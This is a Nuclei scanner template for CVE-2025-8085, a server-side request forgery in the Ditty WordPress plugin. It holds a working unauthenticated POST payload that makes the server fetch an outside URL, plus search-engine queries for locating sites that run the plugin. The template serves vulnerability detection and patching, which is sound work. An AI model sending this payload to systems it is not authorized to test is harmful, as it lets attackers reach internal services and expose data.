http:
- matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, "http")
    - contains_all(body, "{{marker_string}}", "{{marker_int}}")
    - status_code == 200
    type: dsl
  raw:
  - "POST /wp-json/dittyeditor/v1/displayItems HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\n\n{\n  \"apiData\": {\n    \"layouts\": [\n      {\n     \
    \   \"id\": \"{{marker_string}}\",\n        \"html\": \"{image default_src=\\\"\
    http://{{interactsh-url}}\\\"}\",\n        \"css\": \"{{marker_string}}\"\n  \
    \    }\n    ],\n    \"items\": [\n      {\n        \"item_id\": \"{{marker_int}}\"\
    ,\n        \"item_type\": \"default\",\n        \"item_value\": { \"content\"\
    : \"{{marker_string}}\" },\n        \"layout_value\": { \"default\": \"{{marker_string}}\"\
    \ }\n      }\n    ]\n  }\n}\n"
id: CVE-2025-8085
info:
  author: s4e-io
  description: 'The plugin lacks authorization and authentication for requests to
    its displayItems endpoint, allowing unauthenticated visitors to make requests
    to arbitrary URLs. v3.1.57 attempted to fix the issue with a nonce check, however
    any authenticated users, such as subscriber can retrieve it.

    '
  impact: 'Unauthenticated attackers can force the server to make requests to arbitrary
    URLs through the displayItems endpoint, potentially accessing internal services
    and exposing sensitive data.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/ditty-news-ticker/"
    max-request: 1
    publicwww-query: /wp-content/plugins/ditty-news-ticker/
    shodan-query: http.html:"/wp-content/plugins/ditty-news-ticker/"
    verified: true
  name: Ditty < 3.1.58 - Server-Side Request Forgery
  reference:
  - https://wpscan.com/vulnerability/f42c37bb-1ae0-49ab-bd81-7864dff0fcff/
  - https://nvd.nist.gov/vuln/detail/CVE-2025-8085
  - https://research.cleantalk.org/cve-2025-8085/
  remediation: 'Upgrade Ditty WordPress plugin to version 3.1.58 or later that implements
    proper authorization checks on the displayItems endpoint.

    '
  severity: high
  tags: cve,cve2025,ditty-news-ticker,wordpress,wp-plugin,wpscan,wp,metaphorcreations,vuln,vkev
variables:
  marker_int: '{{rand_int(1000, 9999)}}'
  marker_string: '{{rand_text_alpha(5)}}'
